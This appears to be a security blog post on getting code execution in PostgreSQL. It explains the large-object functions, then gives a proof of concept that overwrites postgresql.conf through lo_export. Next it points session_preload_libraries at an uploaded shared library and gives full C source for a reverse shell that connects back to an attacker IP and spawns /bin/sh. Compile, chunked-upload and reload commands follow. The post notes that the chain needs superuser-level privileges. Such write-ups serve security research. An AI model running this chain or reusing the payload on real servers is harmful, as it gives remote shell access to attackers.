---
layout: post
title: PostgreSQL RCE via large objects
comments: false
categories: Works
---

## Background

---

[PostgreSQL large-object server functions](https://www.postgresql.org/docs/current/lo-funcs.html) · [`session_preload_libraries`](https://www.postgresql.org/docs/current/runtime-config-client.html#GUC-SESSION-PRELOAD-LIBRARIES)

### Large Object

A large object is a special type of data that provides stream-style access to data that is too large to be manipulated as a whole.
Large-object contents are split into pages stored as rows in `pg_largeobject`, while their metadata and ownership information are stored in `pg_largeobject_metadata`.

- Privileges

If updating an existing large object (by providing its `lobj_oid`), the user must have the necessary `SELECT` and `UPDATE` privileges for the large object.

### lo_from_bytea

The function `lo_from_bytea()` creates a large object (LOB) from a `bytea` value. The value does not have to come from a table column.

- Syntax

```sql
lo_from_bytea(lobj_oid oid, data bytea) RETURNS oid
```

If `loid` is `0` then an OID will be automatically allocated, otherwise the provided OID will be used.

- Usage

```sql
-- Create a new large object from a BYTEA value
SELECT lo_from_bytea(0, '\x48656c6c6f20576f726c64'); -- "Hello World" in hexadecimal

SELECT * FROM pg_largeobject;
 loid  | pageno |             data             
-------+--------+------------------------------
 12345 |      0 | \x48656c6c6f20576f726c64

-- Update an existing large object (with OID 12345)
SELECT lo_from_bytea(12345, '\x4e65772044617461'); -- "New Data" in hexadecimal
```

## lo_export

The `lo_export` function is used to export the contents of a large object to a file on the server's filesystem.

- Syntax

```sql
SELECT lo_export(oid, filename);
```

- Usage

```sql
SELECT lo_export(12345, '/tmp/exported_file.bin');
```

The contents of large object `12345` will be written to `/tmp/exported_file.bin`.

Server-side `lo_import` and `lo_export` access the database server's filesystem with the operating-system permissions of the PostgreSQL server process. PostgreSQL therefore restricts them to superusers by default, although execution privileges can be granted explicitly to another role.

### lo_import

The `lo_import` function in PostgreSQL is used to import a file from the server's filesystem into the database as a large object (LOB). 

- Syntax

```sql
SELECT lo_import(filename);
SELECT lo_import(filename, oid);
```

If oid is omitted, PostgreSQL will assign a new OID automatically.

- Usage

```sql
SELECT lo_import('/tmp/example_file.bin', 12345);
```

This imports the file `/tmp/example_file.bin` and assigns it the OID `12345`.

### lo_get

The `lo_get` function is for extracting data from a large object.

- Syntax

```sql
SELECT lo_get ( loid oid [, offset bigint, length integer ] ) RETURNS bytea
```

- Usage

```sql
SELECT lo_get(12345);
            lo_get            
------------------------------
 \x48656c6c6f20576f726c64         -- "Hello World" in hexadecimal
(1 row)
```

This returns the data stored in large object `12345`.

### lo_put

The `lo_put` function is for writing data to a large object.

- Syntax

```sql
lo_put ( loid oid, offset bigint, data bytea )
```

Data will be added at the given offset within the large object.

- Usage

```sql
SELECT lo_put(12345, 6, '\x4561727468');
 lo_put 
--------
 
(1 row)

SELECT *, encode(data, 'escape') FROM pg_largeobject WHERE loid = 16394;
 loid  | pageno |             data             |    encode    
-------+--------+------------------------------+--------------
 12345 |      0 | \x48656c6c6f204561727468     | Hello Earth
       |        |                              | 
(1 row)
```

## PoC

The `session_preload_libraries` configuration parameter in PostgreSQL is used to specify a list of shared libraries that should be loaded automatically whenever a new session starts.

If an attacker can write a malicious shared library to the server's filesystem and control `session_preload_libraries`, PostgreSQL will load the library when a new session starts. In this example, the ELF loader runs the library's `_init()` function, which leads to code execution as the PostgreSQL operating-system user.

This chain assumes powerful privileges: the attacker must be able to call server-side `lo_export`, overwrite the active configuration file, reload the configuration, and write to a location from which PostgreSQL can load a library. These capabilities are normally restricted to a superuser or to roles that have been granted equivalent privileges, so this is a privilege-abuse technique rather than a standalone unauthenticated PostgreSQL vulnerability.

### Version

First, check the PostgreSQL version with the following command:

```sql
SELECT version();
```

### Fake postgresql.conf

```yaml
 # - Connection Settings -
 listen_addresses = '*'
    
 # - Memory -
 shared_buffers = 128MB
 dynamic_shared_memory_type = posix

 # - Checkpoints -
 max_wal_size = 1GB
 min_wal_size = 80MB

 # - What to Log -
 log_timezone = 'Etc/UTC'
    
 # - Locale and Formatting -
 datestyle = 'iso, mdy'
 timezone = 'Etc/UTC'

 # These settings are initialized by initdb, but they can be changed.
 lc_messages = 'en_US.utf8'
 lc_monetary = 'en_US.utf8'
 lc_numeric = 'en_US.utf8'
 lc_time = 'en_US.utf8'
    
 # default configuration for text search
 default_text_search_config = 'pg_catalog.english'
    
 dynamic_library_path = '/tmp:$libdir'
 session_preload_libraries = '/tmp/stock.so'
```

I created a replacement configuration file and set `session_preload_libraries` to `/tmp/stock.so`. Later, I upload the malicious shared-library bytes to that server-side path.

```sql
SELECT lo_from_bytea(1234566, decode('ICMgLSBDb25uZWN0aW9uIFNldHRpbmdzIC0KIGxpc3Rlbl9hZGRyZXNzZXMgPSAnKicKIG1heF9jb25uZWN0aW9ucyA9IDEwMAogICAgCiAjIC0gTWVtb3J5IC0KIHNoYXJlZF9idWZmZXJzID0gMTI4TUIKIGR5bmFtaWNfc2hhcmVkX21lbW9yeV90eXBlID0gcG9zaXgKICAgIAogIyAtIENoZWNrcG9pbnRzIC0KIG1heF93YWxfc2l6ZSA9IDFHQgogbWluX3dhbF9zaXplID0gODBNQgogICAgCiAjIC0gV2hhdCB0byBMb2cgLQogbG9nX3RpbWV6b25lID0gJ0V0Yy9VVEMnCiAgICAKICMgLSBMb2NhbGUgYW5kIEZvcm1hdHRpbmcgLQogZGF0ZXN0eWxlID0gJ2lzbywgbWR5JwogdGltZXpvbmUgPSAnRXRjL1VUQycKICAgIAogIyBUaGVzZSBzZXR0aW5ncyBhcmUgaW5pdGlhbGl6ZWQgYnkgaW5pdGRiLCBidXQgdGhleSBjYW4gYmUgY2hhbmdlZC4KIGxjX21lc3NhZ2VzID0gJ2VuX1VTLnV0ZjgnCiBsY19tb25ldGFyeSA9ICdlbl9VUy51dGY4JwogbGNfbnVtZXJpYyA9ICdlbl9VUy51dGY4JwogbGNfdGltZSA9ICdlbl9VUy51dGY4JwogICAgCiAjIGRlZmF1bHQgY29uZmlndXJhdGlvbiBmb3IgdGV4dCBzZWFyY2gKIGRlZmF1bHRfdGV4dF9zZWFyY2hfY29uZmlnID0gJ3BnX2NhdGFsb2cuZW5nbGlzaCcKICAgIAogZHluYW1pY19saWJyYXJ5X3BhdGggPSAnL3RtcDokbGliZGlyJwogc2Vzc2lvbl9wcmVsb2FkX2xpYnJhcmllcyA9ICcvdG1wL3N0b2NrLnNvJw==', 'base64'));
SELECT lo_export(1234566, '/var/lib/postgresql/data/postgresql.conf');
```

The SQL decodes the replacement configuration from base64 and overwrites the active configuration file through a large object.

An administrator can select a different configuration file with the server's `config_file` option. The active source file can be inspected through `pg_file_settings` when the current role has permission to read that view.

```sql
SELECT sourcefile FROM pg_file_settings;
```

### Malicious Shared Library

```c
// payload.c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
    int port = 8888;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("your_IP_addr");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}
```

I created `payload.c`, which contains a reverse-shell payload in its `_init()` function.

I added `PG_MODULE_MAGIC`, a macro used by C-language extensions so PostgreSQL can verify that a loaded module is binary-compatible with the server.

I compiled the code into the shared library `payload.so` with the following command:

```bash
# compile
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -fno-stack-protector -o payload.so payload.c
```

The next step is to upload this binary using a large object. I split the library into base64-encoded chunks.

And I sequentially inserted each chunk into a large object.

I uploaded the first chunk of the `.so` file into a new large object.

```sql
SELECT lo_from_bytea(133301, decode('f0VMRgIBAQAAAAA...=', 'base64'));
```

I then uploaded the remaining chunks with `lo_put()`.

```sql
SELECT lo_put(133301, 2048*n, decode('AAA...=', 'base64'));
```

After storing the complete `.so` file in the large object, I exported it to the path referenced by the replacement configuration.

```sql
SELECT lo_export(133301, '/tmp/stock.so');
```

### Reload configuration

The changed configuration must be reloaded before PostgreSQL reads the new value.

`pg_reload_conf()` asks the PostgreSQL server processes to reload their configuration files.

```sql
SELECT pg_reload_conf();
```

After the reload, the new `session_preload_libraries` value takes effect only when a new connection starts. At that point PostgreSQL loads `/tmp/stock.so`, and its `_init()` function runs.

There is an important limitation in this scenario.

Calling `pg_reload_conf()` is normally restricted to superusers unless its execution privilege has been granted explicitly. Without that privilege, the attacker must wait for an administrator or another authorized process to reload the configuration. Deliberately causing a denial of service does not guarantee that an administrator will reload it and is not a reliable step in the chain.

A malformed setting can be rejected while other valid settings remain active, and PostgreSQL records configuration errors in `pg_file_settings` and the server logs. This behavior is environment-dependent and does not make the technique stealthy; successful application of each setting should be checked explicitly.
